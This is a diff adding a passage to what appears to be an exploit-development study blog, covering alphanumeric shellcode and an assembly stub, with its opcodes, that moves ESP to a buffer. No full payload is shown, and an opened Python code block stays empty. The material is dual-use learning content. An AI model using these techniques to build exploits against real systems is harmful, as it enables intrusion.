@@ -80,6 +80,47 @@ If we scroll down in the CPU Instructions pane to the bottom, you can see that t
 
 ![](/assets/images/CTP/ohyeahLTER.JPG)
 
+To figure out the distance between those two points we do: (`0174FFFF` - `0174FFCC` = `33` or 51 in decimal). So we have **some** room to play with. Previously I tried to make use of this space to jump all the way back to the top of our `A` buffer and put shellcode there but I couldn't make it work because I didn't quite have a good handle on the `SUB` or `ADD` encoding you have to do with the shellcode to make it alphanumeric. 
+
+Let's see what we can do now that we understand it a little bit better.
+
+### Adjusting ESP
+
+As we know, the first thing we have to do before putting our encoded shellcode on the stack is adjust `ESP`. As you can see from our screenshot, `ESP` is residing at `0174ECA4` and we want to put it at the bottom of our `D` buffer since our decoded shellcode will be plopped 'ontop' of it as it's decoded. To figure out how much we have adjust `ESP` we do (`0174FFFF` - `0174ECA4` = `135B` or 4,955 in decimal). So we have to add quite a bit!
+
+To do this, let's:
++ put the current value of `ESP` into `EAX`,
++ add `0x135B` from `EAX`,
++ put the value of `EAX` back into `ESP`. 
+
+In assembly this will look like this: 
+```nasm
+push esp
+pop eax
+add ax, 0x135b
+push eax
+pop esp
+```
+
+To get the opcodes, we'll use `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`:
+```terminal_session
+nasm > push esp
+00000000  54                push esp
+nasm > pop eax
+00000000  58                pop eax
+nasm > add ax, 0x135b
+00000000  66055B13          add ax,0x135b
+nasm > push eax
+00000000  50                push eax
+nasm > pop esp
+00000000  5C                pop esp
+```
+
+Now let's update our exploit to reflect this new `espAdj` and test it:
+```python
+
+![](/assets/images/CTP/ltertest.JPG)
+
 
 ## Big Thanks
 
